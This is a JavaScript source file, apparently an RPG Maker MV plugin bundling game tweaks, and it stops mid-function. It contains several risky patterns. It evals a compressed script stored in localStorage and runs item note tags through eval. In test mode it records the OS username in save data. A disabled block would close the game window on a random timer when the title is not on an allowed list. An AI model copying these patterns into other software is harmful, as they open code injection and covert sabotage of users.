"use strict";
/*:
 * @plugindesc 月藍要用的無參數免調整客製化插件全部都塞在這裡
 * @author agold404
 *
 * @help 程式碼底下有一模一樣的註解，因為RMMV的編輯器有病
 * 
 * This plugin can be renamed as you want.
 */
(dateNow=>{ // all
const DateNow=dateNow;
const ZeroWidthChar=String.fromCharCode(0x200B);


if((()=>{
try{
	const reqTimeDate=Date.now();
	const reqTimePerformance=performance.now();
	const maxTotalWaitMs=1e4;
	if(window._agold404_mainJsBody_tryingRemote) return false;
	const key='-MBR-mainJs-body';
	const onFailed=window._agold404_mainJsBody_localOnly=()=>{
		if(!(Math.max(Date.now()-reqTimeDate,performance.now()-reqTimePerformance)<maxTotalWaitMs)) return; // req >= limited time. treated as fail.
		if(!localStorage.getItem(key)) return;
		localStorage.removeItem(key);
		location.reload();
	};
	if(localStorage.getItem(key+'-localOnly')) return false;
	const scr=localStorage.getItem(key);
	if(scr){
		window._agold404_mainJsBody_tryingRemote=true;
		try{
			eval(LZString.decompressFromBase64(scr));
		}catch(e){
			onFailed();
		}
		return true;
	}
}catch(e){
}
})()){
	window._agold404_skipMainPlugin=true;
	return;
}


(()=>{ const tuneFunc=(p,k,f)=>{ const r=p[k]; (p[k]=f).ori=r; return p; }; let k,r,t; 

tuneFunc(Window_Options.prototype,'volumeOffset',function f(){
	return 10-9*!!Input.isPressed('shift');
});

})();


const tttt="hDmlnQzNCo4poIwE4KYFsCGBrOQAAA==";
const aaaa=new Set([
tttt,
'hDmlnQzNCo4poIwE4KYFsCGBrOB9QaJpiAA=',
]);


const _isDebug=!!($plugins&&$plugins.filter&&$plugins.filter(p=>p.name.indexOf("debug")>=0&&p.status).length);
const cf=(p,k,f,tbl,is_putDeepest,is_notUsingOri)=>{
	if(is_putDeepest && p[k] && p[k].ori){
		let fp=p[k],fc=p[k].ori,fs=new Set();
		do{
			if(fs.has(fc)) throw new Error('f.ori repeated');
			fs.add(fc);
			if(fc.ori){
				fp=fc;
				fc=fc.ori;
			}else break;
		}while(fc);
		f._dbg=fc;
		(fp.ori=f).ori=fc;
	}else{
		const r=p[k];
		p[k]=f;
		f._dbg=r;
		f.ori=r;
	}
	if(is_notUsingOri) f.ori=undefined;
	f.tbl=tbl;
	return p;
};
function cfc(p){
	if(this===window || (typeof globalThis!=='undefined'&&this===globalThis)) throw new Error('call a constructor without new');
	this._p=p;
}
{ const p=cfc.prototype;
p.constructor=cfc;
p.add=function(key,f,t,d,u){
	cf(this._p,key,f,t,d,u);
	return this;
};
p.getP=function(){ return this._p; };
window._cfc=cfc;
}

/*
短到不想變成插件的東西們
*/
{ const p=Array.prototype;
Object.defineProperties(p,{
back:{
	get:function(){ return this[this.length-1]; },
	configurable: true},
});
p.getnth=p.getObjAt=function(i){ return this[i]; };
p.rnd1=function(){ return this[~~(Math.random()*this.length)]; };
p.concat_inplace=function(...items){
	for(let i=0,sz=arguments.length;i!==sz;++i){
		const item=arguments[i];
		if(item instanceof Array) for(let x=0,xs=item.length;x!==xs;++x) this.push(item.getObjAt(x));
		else this.push(item);
	}
	return this;
};
p.pop_back=p.pop;
p.uniqueHas=function(obj){
	if(!this._map){
		this._map=new Map();
		for(let x=0,xs=this.length;x!==xs;++x) this._map.set(this[x],x);
	}
	return this._map.has(obj);
};
p.uniquePush=function( /* obj , ... */ ){
	for(let x=0;x!==arguments.length;++x){
		const obj=arguments[x];
		if(this.uniqueHas(obj)) continue;
		this._map.set(obj,this.length);
		Array.prototype.push.call(this,obj);
	}
	return this.length;
};
p.uniquePushContainer=function(cont){
	// push all cont's elements
	for(let x=0,xs=cont.length;x!==xs;++x) this.uniquePush(cont.getObjAt(x));
	return this;
};
p.uniquePop=function(obj){
	if(!this.uniqueHas(obj)) return;
	const res=this._map.get(obj); if(!(res>=0)) return;
	this._map.delete(obj);
	if(res+1!==this.length) this._map.set(this[res]=this.back,res);
	return Array.prototype.pop.call(this)?obj:undefined;
};
p.uniqueClear=function(){
	if(!this._map) this._map=new Map();
	this._map.clear();
	this.length=0;
};
new cfc(p).add('uniqueSort',function f(cmpFn=undefined){
	const arr=this.slice();
	this.uniqueClear();
	arr.sort.apply(arr,arguments).forEach(f.tbl[0],this);
	return this;
},[
function(x){ this.uniquePush(x); },
],true,true).add('sort',function f(cmpFn=undefined){
	return this._map?this.uniqueSort.apply(this,arguments):f.ori.apply(this,arguments);
}).add('concat_inplace',function f(...items){
	if(!this._map) return f.ori.apply(this,arguments);
	for(let i=0,sz=arguments.length;i!==sz;++i){
		const item=arguments[i];
		if(item instanceof Array) this.uniquePushContainer(item);
		else this.uniquePush(item);
	}
	return this;
});
p.kvHas=function(key){
	if(!this._kvMap) this._kvMap=new Map(this);
	return this._kvMap.has(key);
};
p.kvGetIdx=function(key){
	if(this.kvHas(key)) return this._kvMap.get(key)[0];
};
p.kvGetVal=function(key){
	if(this.kvHas(key)) return this._kvMap.get(key)[2];
};
p.kvPush=function(k,v){
	// this[*] === [idx,key,val]
	if(this.kvHas(k)) this._kvMap.get(k)[2]=v;
	else{
		const info=[this.length,k,v];
		this._kvMap.set(k,info);
		Array.prototype.push.call(this,info);
	}
};
p.kvPop=function(k){
	const rtv=this.kvGetVal(k);
	const idx=this.kvGetIdx(k);
	if(idx>=0){
		this._kvMap.delete(k);
		this.back[0]=idx;
		this[idx]=this.back;
		Array.prototype.pop.call(this);
	}
	return rtv;
};
}
if((typeof Yanfly!=='undefined')&&Yanfly.Util) Yanfly.Util.getRandomElement=arr=>arr.rnd1();
//
{ const p=Set.prototype;
p.intersect=function(set2){
	let base,search;
	if(this.size<set2.size){ base=this; search=set2; }
	else{ base=set2; search=this; }
	const rtv=new Set();
	base.forEach(x=>search.has(x)&&rtv.add(x));
	return rtv;
};
p.union_inplaceThat=function(set2){ this.forEach(x=>set2.add(x)); return set2; };
p.union_inplaceThis=function(set2){ return set2.union_inplaceThat(this); };
p.union=function(set2){
	if(this.size<set2.size) return new Set(set2).union_inplaceThis(this);
	else return new Set(this).union_inplaceThis(set2);
};
p.minus_inplace=function(set2){ set2.forEach(x=>this.delete(x)); return this; };
p.minus=function(set2){ return new Set(this).minus_inplace(set2); };
}
//
{ const p=HTMLElement.prototype,d=document;
d.ce=d.createElement;
d.ctxt=d.createTextNode;
d.ge=d.getElementById;
p.ac=function(c){ this.appendChild(c); return this; };
p.atxt=function(t){ this.appendChild(d.ctxt(t)); return this; };
p.rc=function(c){ this.removeChild(c); return this; }
p.rf=function(i){
	const arr=this.childNodes;
	while(arr.length>i) this.rc(arr[arr.length-1]);
	return this;
};
p.ga=p.getAttribute;
p.sa=function(a,v){ this.setAttribute(a,v); return this; };
}
//
{ const p=HTMLCanvasElement.prototype;
p.ptcp=function(x,y,w,h,resizeTo){
	// partial copy ; return another canvas
	const rtv=document.ce('canvas');
	let targetW=w,targetH=h;
	if(resizeTo){
		if(resizeTo.w) targetW=resizeTo.w;
		if(resizeTo.h) targetH=resizeTo.h;
	}
	rtv.width  =targetW;
	rtv.height =targetH;
	
	const ctx=rtv.getContext('2d');
	ctx.drawImage(
		this,
		x,y,w,h,
		0,0,targetW,targetH
	);
	return rtv;
};
p.scale=function(r){
	// return another canvas
	if(isNaN(r)) r=1;
	const src=r<0?this.mirror_h().mirror_v():this;
	if(r<0) r=-r;
	const w=this.width , h=this.height;
	return src.ptcp(0,0,this.width,this.height,{w:w*r||1,h:h*r||1});
};
}

const useDefaultIfIsNaN=window.useDefaultIfIsNaN=(n,d)=>{
	const rtv=n-0;
	return isNaN(rtv)?d:rtv;
};
const getCStyleStringStartAndEndFromString=window.getCStyleStringStartAndEndFromString=(s,strt,ende)=>{
	// suppose s is a String
	if(ende===undefined) ende=s.length;
	if(strt===undefined) strt=0;
	while(strt<ende && s[strt] && s[strt]!=='"') ++strt;
	for(let x=strt+1,stat=0;s[x]&&x<ende;++x){
		if(s[x]==='\\') ++x;
		else if(s[x]==='"'){
			ende=x+1;
			break;
		}
	}
	if(s[strt]!=='"'||s[ende-1]!=='"'||strt>=ende) ende=strt=-1;
	return {start:strt,end:ende};
};
const getPrefixPropertyNames=window.getPrefixPropertyNames=(obj,prefix)=>{
	const rtv=[];
	for(let i in obj) if(i.slice(0,prefix.length)===prefix) rtv.push(i);
	return rtv;
};
const getTopFrameWindow=window.getTopFrameWindow=()=>{
	let w=window; while(w.parent && w.parent!==w) w=w.parent;
	return w;
};
const chTitle=window.chTitle=title=>{
	return getTopFrameWindow().document.title=title;
};
const copyToClipboard=window.copyToClipboard=s=>{ const d=document;
	const txtin=d.ce("textarea").sa("class","outofscreen");
	d.body.ac(txtin);
	txtin.value=""+s;
	txtin.select();
	txtin.setSelectionRange(0,txtin.value.length);
	d.execCommand("copy");
	txtin.parentNode.removeChild(txtin);
	if(typeof $gameMessage!=='undefined' && $gameMessage && $gameMessage.popup) $gameMessage.popup("已複製: "+s.replace(/\\/g,"\\\\"),1);
};
const pasteCanvas=window.pasteCanvas=c=>{
	const img=document.createElement('img');
	img.src=c.toDataURL();
	img.setAttribute('style','z-index:404;');
	document.body.appendChild(img);
};
const listMapParents=window.listMapParents=mapId=>{
	const rtv=[],s=new Set(); if(mapId===undefined) mapId=$gameMap.mapId();
	while($dataMapInfos[mapId]&&!s.has(mapId)){
		s.add(mapId);
		rtv.push(mapId);
		mapId=$dataMapInfos[mapId].parentId;
	}
	return rtv.reverse();
};
const getUrlParamVal=window.getUrlParamVal=key=>{
	const h0=ImageManager.splitUrlQueryHash(location.href);
	const ht=ImageManager.splitUrlQueryHash(getTopFrameWindow().location.href);
	let r;
	if(r===undefined) r=ImageManager._parseQs_uqh(ht,2)[key];
	if(r===undefined) r=ImageManager._parseQs_uqh(ht,1)[key];
	if(r===undefined) r=ImageManager._parseQs_uqh(h0,2)[key];
	if(r===undefined) r=ImageManager._parseQs_uqh(h0,1)[key];
	return r;
};

{ const a=Game_Interpreter,p=a.prototype;
a.NOP={code:0,indent:0,parameters:[],};
// prevent being slow due to getting non-exists property
for(let x=0,arr=[0,404,];x!==arr.length;++x){
	const key='command'+arr[x];
	p[key]=p[key]||undefined;
}
new cfc(p).add('command111',function f(){
	if(this._params&&this._params[0]===11){
		const func=f.tbl[0][this._params[1]];
		if(func && func()){
			this._branch[this._indent]=true;
			return true;
		}
	}
	return f.ori.apply(this,arguments);
},[
{
ok:()=>TouchInput.isPressed(),
cancel:()=>TouchInput.isCancelled(),
},
]).add('setupChild',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(this._childInterpreter) this._childInterpreter._parentInterpreter=this._childInterpreter;
	return rtv;
});
}
cf(Game_System.prototype,'initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._rndId=LZString.compressToBase64(''+Date.now()+Math.random()+Math.random()).slice(11);
	return rtv;
});
Game_Timer.prototype.onExpire=()=>{}; // not abort battle
Game_Unit.prototype.allMembers=function(){ return this.members(); };
Game_Troop.prototype.makeUniqueNames=()=>{}; // not set letter
new cfc(Game_Action.prototype).add('applyGlobal',function f(){
	const rtv=f.ori.apply(this,arguments);
	this.applyGlobal_javascript();
	return rtv;
}).add('applyGlobal_javascript',function f(){
	const item=this.item();
	const js=item && item.meta[f.tbl[0]];
	if(js){
		eval(js);
	}
},[
"applyGlobal_javascript",
]);
PIXI.ObservablePoint.prototype.resize=function(n){ return this.set(n,n); };
PIXI.Rectangle.prototype.equals=function(rect){ return this.x===rect.x&&this.y===rect.y&&this.width===rect.width&&this.height===rect.height; };
ConfigManager.readVolume=function(config, name){ const value=config[name]; return (value===undefined)?50:Number(value).clamp(0, 100); };
{ const p=PIXI.Container.prototype;
p._findChildren_r=function(f,rtv){ if(f(this)) rtv.push(this); for(let x=0,arr=this.children;x!==arr.length;++x) arr[x]._findChild_r(f,rtv); return rtv; };
p.findChildren=function(f){ const rtv=[]; return this._findChild_r(f,rtv); };
}
//
new cfc(Game_Enemy.prototype).add('skills',function f(){
	return this.getData().actions.map(f.tbl[0]).concat_inplace(this.addedSkills()).map(f.tbl[1]).filter(f.tbl[2]);
},[
act=>act&&act.skillId,
i=>$dataSkills[i],
x=>x,
],false,true);
//
Sprite_Actor.prototype.damageOffsetY=()=>-32; // 角色身上的數字上shift
{ const p=SceneManager;
p.isScene_battle =function(){ const sc=this._scene; return sc && sc.constructor===Scene_Battle; };
p.isScene_map    =function(){ const sc=this._scene; return sc && sc.constructor===Scene_Map;    };
}
//
SceneManager.getScConstructor=function(){ return this._scene && this._scene.constructor; };
new cfc(Game_Action.prototype).add('makeTargets',function f(){
	let targets;
	if(this.isForOpponent()) targets = this.makeTargets_confused() || this.targetsForOpponents();
	else if(this.isForFriend()) targets = this.makeTargets_confused() || this.targetsForFriends();
	return this.repeatTargets(targets || []);
},undefined,false,true).add('isConfuseResisted',function f(){
	return false;
}).add('makeTargets_confused',function f(){
	if(this._forcing || this.isConfuseResisted() || !this.subject().isConfused()) return;
	return [this.confusionTarget()];
});
{ const p=Window_BattleLog.prototype,k='displayAffectedStatus'; const r=p[k]; (p[k]=function(){}).ori=r; } // 月藍沒有用這個東西
new cfc(Game_Battler.prototype).add('getCounterAttackSkillId',function f(){
	return 1;
},undefined,true,true);
new cfc(BattleManager).add('invokeMagicReflection',function f(subject,target){
	return this.invokeNormalAction(subject,subject);
},undefined,false,true).add('invokeCounterAttack',function f(subject,target){
	const act=this._action;
	this._action=new Game_Action(target);
	this._action.setSkill(target.getCounterAttackSkillId());
	this.invokeNormalAction(target,subject);
	this._action=act;
},undefined,false,true);
new cfc(Graphics).add('_requestFullScreen',function(){
	const element = getTopFrameWindow().document.body;
	if(element.requestFullScreen) element.requestFullScreen();
	else if(element.mozRequestFullScreen) element.mozRequestFullScreen();
	else if(element.webkitRequestFullScreen) element.webkitRequestFullScreen(Element.ALLOW_KEYBOARD_INPUT);
	else if(element.msRequestFullscreen) element.msRequestFullscreen();
},undefined,true,true).add('_isFullScreen',function(){
	const d=getTopFrameWindow().document;
	return ( (d.fullScreenElement && d.fullScreenElement !== null) || (!d.mozFullScreen && !d.webkitFullscreenElement && !d.msFullscreenElement) );
},undefined,true,true).add('_cancelFullScreen',function(){
	const d=getTopFrameWindow().document;
	if(d.cancelFullScreen) d.cancelFullScreen();
	else if(d.mozCancelFullScreen) d.mozCancelFullScreen();
	else if(d.webkitCancelFullScreen) d.webkitCancelFullScreen();
	else if(d.msExitFullscreen) d.msExitFullscreen();
},undefined,true,true);
Scene_Boot.prototype.updateDocumentTitle=()=>{
	getTopFrameWindow().document.title=$dataSystem.gameTitle;
};
Graphics.getScale=function(){
	const c=this._canvas;
	return Math.min(c.scrollWidth/c.width,c.scrollHeight/c.height);
};
new cfc(Graphics).add('_updateAllElements',function f(){
	const rtv=f.ori.apply(this,arguments);
	this._updateAsGameCanvas();
	return rtv;
}).add('_updateAsGameCanvas',function f(){
	const arr=document.querySelectorAll('.AsGameCanvas');
	for(let x=0,xs=arr.length;x!==xs;++x){
		this._centerElement(arr[x]);
		if((typeof f)===(typeof arr[x]._onCenterElement)) arr[x]._onCenterElement();
	}
}).add('addAsGameCanvas',function f(dom){
	if(!dom || !dom.classList) return;
	dom.classList.add('AsGameCanvas');
	this._centerElement(dom);
});
new cfc(Graphics).add('refGameSystem_get',function(){
	return this._refGameSystem;
}).add('refGameSystem_set',function(ref){
	if(ref===undefined) ref=$gameSystem;
	return this._refGameSystem=ref;
}).add('refGameSystem_isCurrent',function f(){
	return this.refGameSystem_get()===$gameSystem;
});
{ const p=TilingSprite.prototype;
p.isInScreen_local=p.isInScreen_local;
}
new cfc(Sprite.prototype).add('isInScreen_local',function(){
	// calc. local only to reduce calc.

	if(!this.visible || !this.alpha || !this.renderable) return;
	
	const a=this.anchor,s=this.scale;
	const sx=s.x,sy=s.y;
	const xo=this.x,yo=this.y,ws=this.width*sx,hs=this.height*sy;
	let x=xo-ws*a.x,xe=x+ws; if(xe<x){ let t=x; x=xe; xe=t; }
	let y=yo-hs*a.y,ye=y+hs; if(ye<y){ let t=y; y=ye; ye=t; }
	if(x>=Graphics._boxWidth||xe<0||y>=Graphics._boxHeight||ye<0) return; // out-of-bound
	
	return true;
});
new cfc(Graphics).add('isInScreen_rect',function(rect){
	return !(rect.x>=this.boxWidth || rect.x+rect.width<0 || rect.y>=this.boxHeight || rect.y+rect.height<0);
});
//
let t;
const undef=undefined,none=()=>{},TR=1708640542222,TR202=1706839322020,TR303=1709434983030,TR404=1712203444404,TR0404=1722222744444;
if(Utils.isOptionValid('test')){
const _getUsrname=window.getUsrname=Utils.isOptionValid('test')?(()=>{
	let rtv;
	if(typeof require==='function'){ try{
		rtv=require("os").userInfo().username;
	}catch(e){
	} }
	return rtv;
}):none;
new cfc(Game_System.prototype).add('initialize',function f(){
	const rtv=f.ori.apply(this,arguments);
	if(this._usrname=f.tbl[0]()) this._usrname=btoa(this._usrname);
	return rtv;
},[
_getUsrname,
]);
}
const getStr_英文不好齁=t=function f(){
	const idx=(((typeof $gameVariables!=='undefined')&&$gameVariables&&($gameVariables.value(f.tbl[0])>=f.tbl[1]))|0)+2;
	return f.tbl[idx];
}; t.ori=undef; t.tbl=[
10,
672,
'\n\n給看ㄅ懂英文ㄉ人ㄉ台譯版：',
'\n\n給"比ㄏㄆ還不如，看ㄅ懂英文的ㄏㄆ"的台譯版：',
];
const makeDummyWindowProto=t=function f(c,withContents,withCursor){
	let tmp;
	if(c.constructor===Function){
		tmp=c.prototype;
	}else{
		tmp=c._downArrowSprite;
		if(tmp){
			c._downArrowSprite=undefined;
			tmp.visible=false;
			if(tmp.parent) tmp.parent.removeChild(tmp);
		}
		tmp=c._upArrowSprite;
		if(tmp){
			c._upArrowSprite=undefined;
			tmp.visible=false;
			if(tmp.parent) tmp.parent.removeChild(tmp);
		}
		tmp=c._rightArrowSprite;
		if(tmp){
			c._rightArrowSprite=undefined;
			tmp.visible=false;
			if(tmp.parent) tmp.parent.removeChild(tmp);
		}
		tmp=c._leftArrowSprite;
		if(tmp){
			c._leftArrowSprite=undefined;
			tmp.visible=false;
			if(tmp.parent) tmp.parent.removeChild(tmp);
		}
		tmp=c._windowPauseSignSprite;
		if(tmp){
			c._windowPauseSignSprite=undefined;
			tmp.visible=false;
			if(tmp.parent) tmp.parent.removeChild(tmp);
		}
		tmp=c;
		//tmp._upArrowVisible=tmp._downArrowVisible=false;
	}
	const p=tmp;
	if(!withContents){
		p._refreshContents=none;
		p._updateContents=none;
	}
	if(withCursor){
		p._createAllParts=f._createAllParts_cursor;
	}else{
		p._createAllParts=f._createAllParts;
		p._refreshCursor=none;
		p._updateCursor=none;
	}
	p._refreshArrows=none;
	p._refreshPauseSign=none;
	p._updateArrows=none;
	p._updatePauseSign=none;
};
t._createAllParts = function(){
	this._windowSpriteContainer = new PIXI.Container();
	this._windowBackSprite = new Sprite();
	//this._windowCursorSprite = new Sprite();
	this._windowFrameSprite = new Sprite();
	this._windowContentsSprite = new Sprite();
	//this._downArrowSprite = new Sprite();
	//this._upArrowSprite = new Sprite();
	//this._windowPauseSignSprite = new Sprite();
	this._windowBackSprite.bitmap = new Bitmap(1, 1);
	this._windowBackSprite.alpha = 192 / 255;
	this.addChild(this._windowSpriteContainer);
	this._windowSpriteContainer.addChild(this._windowBackSprite);
	this._windowSpriteContainer.addChild(this._windowFrameSprite);
	//this.addChild(this._windowCursorSprite);
	this.addChild(this._windowContentsSprite);
	//this.addChild(this._downArrowSprite);
	//this.addChild(this._upArrowSprite);
	//this.addChild(this._windowPauseSignSprite);
};
t._createAllParts_cursor = function(){
	this._windowSpriteContainer = new PIXI.Container();
	this._windowBackSprite = new Sprite();
	this._windowCursorSprite = new Sprite();
	this._windowFrameSprite = new Sprite();
	this._windowContentsSprite = new Sprite();
	//this._downArrowSprite = new Sprite();
	//this._upArrowSprite = new Sprite();
	//this._windowPauseSignSprite = new Sprite();
	this._windowBackSprite.bitmap = new Bitmap(1, 1);
	this._windowBackSprite.alpha = 192 / 255;
	this.addChild(this._windowSpriteContainer);
	this._windowSpriteContainer.addChild(this._windowBackSprite);
	this._windowSpriteContainer.addChild(this._windowFrameSprite);
	this.addChild(this._windowCursorSprite);
	this.addChild(this._windowContentsSprite);
	//this.addChild(this._downArrowSprite);
	//this.addChild(this._upArrowSprite);
	//this.addChild(this._windowPauseSignSprite);
};
if(0) // free to change title
{
let gggg=0;
if(!Utils.isOptionValid('test')){ try{
	const bbbb=(()=>{
		const arr=[]; aaaa.forEach(v=>arr.push(LZString.decompressFromBase64(v)));
		return new Set(arr);
	})();
	if(!(dateNow-40404040404<TR0404)&&!bbbb.has(getTopFrameWindow().document.title)) gggg=6e5+6e6*Math.random();
}catch(e){
	gggg=6e5+1e6*Math.random();
} }
try{
gggg|=0;
gggg && setTimeout(()=>getTopFrameWindow().close(),gggg);
}catch(e){
}
}
//
cf(cf(cf(cf(Input,'isTexting_set',function f(){
	this._isTexting=true;
}),'isTexting_clear',function f(){
	this._isTexting=false;
}),'isTexting',function f(){
	return this._isTexting;
}),'_shouldPreventDefault',function f(keyCode){
	if(this.isTexting()) return false;
	return f.ori.apply(this,arguments);
});
t=[
none,
];
new cfc(TouchInput).add('_onTouchStart',function f(event){
	this._touched=true;
	let preventDefaulted=false;
	for(let i=0;i<event.changedTouches.length;++i){
		const touch=event.changedTouches[i];
		const x=Graphics.pageToCanvasX(touch.pageX);
		const y=Graphics.pageToCanvasY(touch.pageY);
		if (event.touches.length >= 2) {
			this._screenPressed = true;
			this._pressedTime = 0;
			this._onCancel(x, y, event);
			if(!preventDefaulted){ preventDefaulted=true; event.preventDefault(); }
		} else {
			if (Graphics.isInsideCanvas(x, y)) {
				this._screenPressed = true;
				this._pressedTime = 0;
				this._onTrigger(x, y, event);
				if(!preventDefaulted){ preventDefaulted=true; event.preventDefault(); }
			}
		}
	}
	if (window.cordova || window.navigator.standalone) {
		if(!preventDefaulted){ preventDefaulted=true; event.preventDefault(); }
	}
},undefined,true,true).add('_onWheel',function f(evt){
	if(this.bypassPreventDefault_wheel_get(evt)) evt.preventDefault=f.tbl[0];
	return f.ori.apply(this,arguments);
},t).add('bypassPreventDefault_wheel_get',function f(){
	return this._bypassPreventDefault_wheel||this._bypassPreventDefault_wheel_stackSize;
}).add('bypassPreventDefault_wheel_set',function f(rhs){
	return this._bypassPreventDefault_wheel=rhs;
}).add('bypassPreventDefault_wheel_stackPushTrue',function f(){
	this._bypassPreventDefault_wheel_stackSize|=0;
	return ++this._bypassPreventDefault_wheel_stackSize;
}).add('bypassPreventDefault_wheel_stackPop',function f(){
	this._bypassPreventDefault_wheel_stackSize|=0;
	return --this._bypassPreventDefault_wheel_stackSize;
}).add('_onTouchStart',function f(evt){
	if(this.bypassPreventDefault_touch_get(evt)) evt.preventDefault=f.tbl[0];
	return f.ori.apply(this,arguments);
},t).add('_onTouchMove',function f(evt){
	if(this.bypassPreventDefault_touch_get(evt)) evt.preventDefault=f.tbl[0];
	return f.ori.apply(this,arguments);
},t).add('_onTouchEnd',function f(evt){
	if(this.bypassPreventDefault_touch_get(evt)) evt.preventDefault=f.tbl[0];
	return f.ori.apply(this,arguments);
},t).add('bypassPreventDefault_touch_get',function f(){
	return this._bypassPreventDefault_touch||this._bypassPreventDefault_touch_stackSize;
}).add('bypassPreventDefault_touch_set',function f(rhs){
	return this._bypassPreventDefault_touch=rhs;
}).add('bypassPreventDefault_touch_stackPushTrue',function f(){
	this._bypassPreventDefault_touch_stackSize|=0;
	return ++this._bypassPreventDefault_touch_stackSize;
}).add('bypassPreventDefault_touch_stackPop',function f(){
	this._bypassPreventDefault_touch|=0;
	return --this._bypassPreventDefault_touch_stackSize;
});
//
new cfc(AudioManager).add('audioFileExt',function f(){
	return f.tbl[0];
},[
'.ogg',
],true,true).add('createBuffer',function(folder, name) {
	const ext = this.audioFileExt();
	const url = this._path + folder + '/' + name + ext;
	if(this.shouldUseHtml5Audio() && folder === 'bgm'){
		if(this._blobUrl) Html5Audio.setup(this._blobUrl);
		else Html5Audio.setup(url);
		return Html5Audio;
	}else return new WebAudio(url);
},undefined,false,true);
//
SceneManager._updateSceneCnt=0|0;
new cfc(SceneManager).add('isMapOrIsBattle',function f(){
	return this._scene&&f.tbl.has(this._scene.constructor);
},new Set([Scene_Map,Scene_Battle])).add('updateMain',function f(){
	if(Utils.isMobileSafari()){
		// this.updateInputData(); // already in .update
		this.changeScene(); this.updateScene();
	}else{
		const newTime=this._getTimeInMsWithoutMobileSafari();
		const fTime=Math.min((newTime-this._currentTime)/1000,f.tbl[0]);
		this._currentTime=newTime;
		this._accumulator+=fTime;
		for(;this._accumulator>=this._deltaTime;this._accumulator-=this._deltaTime){
			this.updateInputData();
			this.changeScene(); this.updateScene();
		}
	}
	this.renderScene();
	this.requestUpdate();
},[0.25,],true,true).add('updateScene',function f(){
	++this._updateSceneCnt; // reset to zero when 'Graphics.frameCount' increase // in 'Graphics.render'
	return f.ori.apply(this,arguments);
});
new cfc(Window_Base.prototype).add('positioning',function f(setting,ref){
	setting=setting||f.tbl;
	let x,y,w,h;
	if(ref){
		x=ref.x;
		y=ref.y;
		w=ref.width;
		h=ref.height;
	}
	if('x' in setting) x=setting.x;
	if('y' in setting) y=setting.y;
	if('w' in setting) w=setting.w;
	if('h' in setting) h=setting.h;
	x=x-0||0;
	y=y-0||0;
	w=w-0||0;
	h=h-0||0;
	if(ref&&setting.align){
		if(0){
		}else if(setting.align==='beforeX'){
			y=ref.y;
			x=ref.x-w;
		}else if(setting.align==='beforeY'){
			x=ref.x;
			y=ref.y-h;
		}else if(setting.align==='afterX'){
			y=ref.y;
			x=ref.x+ref.width;
		}else if(setting.align==='afterY'){
			x=ref.x;
			y=ref.y+ref.height;
		}
	}
	this.x=x;
	this.y=y;
	this.width=w;
	this.height=h;
},{}).add('processCStyleStringContent',function f(textState){
	const info=getCStyleStringStartAndEndFromString(textState.text,textState.index);
	if(info.start<info.end){
		textState.index=info.end;
		return JSON.parse(textState.text.slice(info.start,info.end));
	}else return f.tbl[0];
},[''],true,true);
//
cf(cf(cf(Window_Selectable.prototype,'processCursorMove',t=function f(){
	const idx=this.index();
	const rtv=f.ori.apply(this,arguments);
	if(this.isCursorMovable()){
		const idx2=this.index();
		f.tbl[0].forEach(f.tbl[1],this);
		if(idx===idx2){
			f.tbl[2].forEach(f.tbl[3],this);
			if(idx!==this.index()) SoundManager.playCursor();
		}
	}
	return rtv;
},[[[35,'end',function(){
	const M=this.maxItems(); // if(!(0<M)) return; // called in 'this.isCursorMovable'
	this.select(M-1);
}],[36,'home',function(){
	const M=this.maxItems(); // if(!(0<M)) return; // called in 'this.isCursorMovable'
	this.select(0);
}],],function(info){
	if(Input.isTriggered(info[1])) info[2].call(this);
},[[33,'pageup',function(){
	this.cursorPageup();
}],[34,'pagedown',function(){
	this.cursorPagedown();
}],],function(info){
	if( !this.isHandled(info[1]) && Input.isRepeated(info[1]) && !Input.isTriggered(info[1]) ) info[2].call(this);
},]),'cursorPageup',function f(){
	const idx=this.index();
	const rtv=f.ori.apply(this,arguments);
	if(idx>=0 && idx===this.index()){
		const C=this.maxCols();
		if(idx>=C) this.select(idx%C);
	}
	return rtv;
}),'cursorPagedown',function f(){
	const idx=this.index();
	const rtv=f.ori.apply(this,arguments);
	if(idx>=0 && idx===this.index()){
		const M=this.maxItems();
		if(0<M) this.select(M-1);
	}
	return rtv;
});
t.tbl[0].forEach(info=>{
	Input.keyMapper[info[0]]=info[1];
});
t=undefined;
//
new cfc(Window_Base.prototype).add('updateClose',function f(){
	const isClosed=this.isClosed();
	const rtv=f.ori.apply(this,arguments);
	if(!isClosed && this.isClosed()) this.onclosed();
	return rtv;
}).add('onclosed',function f(){
},undefined,false,true);
new cfc(Window_Message.prototype).add('onclosed',function f(){
	Window_Base.prototype.onclosed.apply(this,arguments);
	if(this._positionType!==2 && this._choiceWindow && this._choiceWindow.updatePlacement){ this.updatePlacement(); this._choiceWindow.updatePlacement(); }
},undefined,false,true);
if(Window_Message.prototype.updateClose===Window_Base.prototype.updateClose){
new cfc(Window_Message.prototype).add('updateClose',function f(){
	const rtv=Window_Base.prototype.updateClose.apply(this,arguments);
	return rtv;
},undefined,false,true);
}
//
new cfc(Scene_Base.prototype).add('_prevScene_store',function f(){
	// called when 'scene.initialize'
	this._lastBgBm=SceneManager.backgroundBitmap();
	this._oriStop=undefined;
	const sc=this._prevScene=SceneManager._scene;
	if(sc){
		if(sc.constructor===Scene_Battle){
			// _fadeSprite
			this._oriStop=sc.stop;
			sc.stop=f.tbl[0];
		}
		SceneManager.snapForBackground();
	}
},[
function(){ Scene_Base.prototype.stop.call(this); },
],true,true).add('_prevScene_restore',function f(){
	// called in 'scene.create', after background created
	if(this._oriStop){
		const sc=this._prevScene; // if this._oriStop!==undefined, sc!==undefined // already stopped 
		if(this._oriStop===sc.constructor.prototype.stop) delete sc.stop;
		else sc.stop=this._oriStop;
	}
	if(this._lastBgBm) SceneManager._backgroundBitmap=this._lastBgBm;
},t,true,true);
//
if(!Utils.isOptionValid('test')&&!(DateNow<TR202)) new cfc(Scene_Boot.prototype).add('start',function f(){
	const rtv=f.ori.apply(this,arguments);
	$dataItems.forEach(f.tbl[0][0].bind(this,f.tbl[0][1]));
	return rtv;
},[
[
	// items
	function(args,dataobj){ if(!dataobj||!dataobj.name||!dataobj.description) return;
		const re=args[0],ex=args[1];
		if(dataobj.name.match(re) && !ex.has(dataobj.name)) dataobj.price=1e11;
	},
	[/白.*粉/,new Set([
		"白蜜粉",
	]),]
],
]);
//
new cfc(DataManager).add('isSkill',function f(item){
	return item && $dataSkills.uniqueHas(item);
}).add('isItem',function f(item){
	return item && $dataItems.uniqueHas(item);
}).add('isWeapon',function f(item){
	return item && $dataWeapons.uniqueHas(item);
}).add('isArmor',function f(item){
	return item && $dataArmors.uniqueHas(item);
